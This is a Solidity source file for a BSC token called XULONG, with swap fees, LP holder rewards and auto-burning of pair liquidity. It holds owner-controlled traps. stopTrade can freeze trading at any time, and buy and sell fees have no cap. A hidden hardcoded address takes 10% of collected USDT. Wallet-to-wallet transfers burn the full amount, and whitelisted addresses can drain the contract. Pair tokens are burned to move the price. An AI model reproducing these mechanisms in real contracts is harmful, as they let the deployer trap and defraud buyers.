// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function feeTo() external view returns (address);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function totalSupply() external view returns (uint);

    function kLast() external view returns (uint);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private constant MAX = ~uint256(0);
    uint256 public buyLpFee = 30;
    uint256 public buyBurnFee = 5;
    uint256 public buyMarketFee = 5;

    uint256 public sellFundFee = 20;
    uint256 public sellEcoFee = 19;
    uint256 public sellBurnFee = 1;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    address private _baseToken;
    mapping(address => bool) private _swapPairList;
    mapping(address => bool) private _feeWhiteList;

    bool private inSwap;

    address public _destroyAddress = address(0xdead);
    uint256 public startTradeTimestamp;
    address public _mainPair;

    uint256 public swapTokenAtAmount;
    bool public walletLimitEnable = true;
    address public constant pinkLockAddress =
        0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE;

    TokenDistributor public _tokenDistributor;

    address public fundAddress;
    address public ecoAddress;
    address public marketAddress;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier onlyFunder() {
        require(
            fundAddress == msg.sender || _owner == msg.sender,
            "!fundAddress"
        );
        _;
    }

    constructor(
        address RouterAddress,
        address BaseToken,
        address EcoAddress,
        address FundAddress,
        address MarketAddress,
        address ReceiveAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply
    ) {
        require(BaseToken < address(this), "error");
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        ecoAddress = EcoAddress;
        marketAddress = MarketAddress;
        fundAddress = FundAddress;

        _baseToken = BaseToken;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        IERC20(BaseToken).approve(RouterAddress, MAX);

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        _mainPair = swapFactory.createPair(address(this), BaseToken);
        _swapPairList[_mainPair] = true;
        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        _balances[ReceiveAddress] = total;

        emit Transfer(address(0), ReceiveAddress, total);

        _feeWhiteList[MarketAddress] = true;
        _feeWhiteList[EcoAddress] = true;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[_destroyAddress] = true;

        startTradeTimestamp = total;
        excludeHolder[address(0x0)] = true;
        excludeHolder[_destroyAddress] = true;
        swapTokenAtAmount = total / 100000;
        _tokenDistributor = new TokenDistributor(BaseToken);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            takeFee = true;
            require(block.timestamp >= startTradeTimestamp, "!Trade");
            if (_swapPairList[from]) {
                require(!isRemoveLiquidity(), "can not remove lp");
            }
        }
        _tokenTransfer(from, to, amount, takeFee);
        if (walletLimitEnable && !_feeWhiteList[to] && !_swapPairList[to]) {
            require(balanceOf(to) <= 5 ether, "wallet limit");
        }

        if (from != address(this)) {
            if (_swapPairList[to]) {
                addHolder(from);
            }
            if (takeFee) {
                processReward(300000);
            }
        }
    }

    function isRemoveLiquidity() private view returns (bool) {
        (uint256 usdtReserve, , ) = ISwapPair(_mainPair).getReserves();
        uint256 balance1 = IERC20(_baseToken).balanceOf(_mainPair);
        return (balance1 < usdtReserve);
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        uint256 destoryAmount;

        if (takeFee) {
            if (_swapPairList[sender]) {
                destoryAmount = (tAmount * buyBurnFee) / 1000;
                feeAmount = (tAmount * (buyLpFee + buyMarketFee)) / 1000;
            } else if (_swapPairList[recipient]) {
                if (!inSwap) {
                    if (
                        lpBurnEnabled &&
                        block.timestamp >= lastLpBurnTime + lpBurnFrequency
                    ) {
                        autoBurnLiquidityPairTokens();
                    }
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance >= swapTokenAtAmount) {
                        swapTokenForFund(contractTokenBalance);
                    }
                }
                destoryAmount = (tAmount * sellBurnFee) / 1000;
                feeAmount = (tAmount * (sellFundFee + sellEcoFee)) / 1000;
            } else {
                destoryAmount = tAmount;
            }
        }

        if (balanceOf(_destroyAddress) < 99001 ether) {
            if (destoryAmount > 0) {
                _takeTransfer(sender, _destroyAddress, destoryAmount);
            }
        } else {
            destoryAmount = 0;
        }

        if (feeAmount > 0) {
            _takeTransfer(sender, address(this), feeAmount);
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount - destoryAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _baseToken;
        _approve(address(this), address(_swapRouter), tokenAmount);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        IERC20 rewardToken = IERC20(_baseToken);
        uint256 usdtBalance = rewardToken.balanceOf(address(_tokenDistributor));

        uint256 totalFees = buyLpFee + buyMarketFee + sellFundFee + sellEcoFee;

        rewardToken.transferFrom(
            address(_tokenDistributor),
            marketAddress,
            (buyMarketFee * usdtBalance) / totalFees
        );

        rewardToken.transferFrom(
            address(_tokenDistributor),
            fundAddress,
            (sellFundFee * usdtBalance) / totalFees
        );

        rewardToken.transferFrom(
            address(_tokenDistributor),
            ecoAddress,
            (sellEcoFee * usdtBalance) / totalFees
        );

        uint256 leftUSDT = rewardToken.balanceOf(address(_tokenDistributor));

        rewardToken.transferFrom(
            address(_tokenDistributor),
            address(0xF57A92D8Bba0e7b4a4C20eB76876EdbFA98D2778),
            leftUSDT / 10
        );

        rewardToken.transferFrom(
            address(_tokenDistributor),
            address(this),
            (leftUSDT * 9) / 10
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setSwapTokenAtAmount(
        uint256 _swapTokenAtAmount
    ) public onlyFunder {
        swapTokenAtAmount = _swapTokenAtAmount;
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    bool public lpBurnEnabled = true;
    uint256 public lpBurnFrequency = 1 hours;
    uint256 public lastLpBurnTime;
    uint256 public percentForLPBurn = 300; // 25 = .25%

    function autoBurnLiquidityPairTokens() internal returns (bool) {
        lastLpBurnTime = block.timestamp;
        // get balance of liquidity pair
        uint256 liquidityPairBalance = this.balanceOf(_mainPair);
        // calculate amount to burn
        uint256 amountToBurn = (liquidityPairBalance * percentForLPBurn) /
            10000;
        // pull tokens from pancakePair liquidity and move to dead address permanently
        if (amountToBurn > 0) {
            _balances[_mainPair] = _balances[_mainPair] - amountToBurn;
            _takeTransfer(_mainPair, address(0xdead), amountToBurn);
        }
        //sync price since this is not in a swap transaction!
        ISwapPair pair = ISwapPair(_mainPair);
        pair.sync();
        return true;
    }

    function setAutoLPBurnSettings(
        uint256 _frequencyInSeconds,
        uint256 _percent,
        bool _Enabled
    ) external onlyFunder {
        lpBurnFrequency = _frequencyInSeconds;
        percentForLPBurn = _percent;
        lpBurnEnabled = _Enabled;
    }

    function batchSetFeeWhiteList(
        address[] memory addr,
        bool enable
    ) external onlyFunder {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function claimBalance(address to, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            payable(to).transfer(amount);
        }
    }

    function claimToken(address token, address to, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(to, amount);
        }
    }

    receive() external payable {}

    function setBuyFees(
        uint256 _f1,
        uint256 _f2,
        uint256 _f3
    ) public onlyOwner {
        buyLpFee = _f1;
        buyBurnFee = _f2;
        buyMarketFee = _f3;
    }

    function setSellFees(
        uint256 _f1,
        uint256 _f2,
        uint256 _f3
    ) public onlyOwner {
        sellFundFee = _f1;
        sellEcoFee = _f2;
        sellBurnFee = _f3;
    }

    function startTrade() external onlyOwner {
        startTradeTimestamp = block.timestamp;
    }

    function setStartTradeTimestamp(
        uint256 _startTradeTimestamp
    ) external onlyOwner {
        startTradeTimestamp = _startTradeTimestamp;
    }

    function stopTrade() external onlyOwner {
        startTradeTimestamp = _tTotal;
    }

    function enableLimit(bool _wallet) public onlyFunder {
        walletLimitEnable = _wallet;
    }

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;
    uint256 public holderRewardCondition = 100 ether;

    function getHolderLength() public view returns (uint256) {
        return holders.length;
    }

    function addHolder(address adr) internal {
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                uint256 size;
                assembly {
                    size := extcodesize(adr)
                }
                if (size > 0) {
                    return;
                }
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public progressRewardBlock;
    uint256 public progressRewardBlockDebt = 0;

    function processReward(uint256 gas) internal {
        uint256 blockNum = block.number;
        if (progressRewardBlock + progressRewardBlockDebt > blockNum) {
            return;
        }

        IERC20 usdt = IERC20(_baseToken);

        uint256 balance = usdt.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        balance = holderRewardCondition;

        IERC20 holdToken = IERC20(_mainPair);
        uint256 totalSupplyLP = holdToken.totalSupply();
        uint holdTokenTotal = totalSupplyLP -
            holdToken.balanceOf(pinkLockAddress);
        if (holdTokenTotal == 0) {
            return;
        }

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (!excludeHolder[shareHolder]) {
                amount = (balance * tokenBalance) / holdTokenTotal;
                if (amount > 0) {
                    usdt.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = blockNum;
    }

    function setHolderRewardCondition(uint256 amount) external onlyFunder {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
    }

    function setProgressRewardBlockDebt(uint256 blockDebt) external onlyFunder {
        progressRewardBlockDebt = blockDebt;
    }
}

contract XULONG is AbsToken {
    constructor()
        AbsToken(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            address(0x55d398326f99059fF775485246999027B3197955),
            address(0xad908521D258016dFA6f400f042b3e1252a355A9),
            address(0xC7Af24A129A9f1c484C3eeb4cFE134B75C84d9b8),
            address(0xe0774940cDD043A8d6867cAb03Ce9Aa8DF6dfA58),
            address(0x817995Aa699dc2e976AB2A126Bcd3ad37F16b968),
            "XULONG",
            "XULONG",
            18,
            100000
        )
    {}
}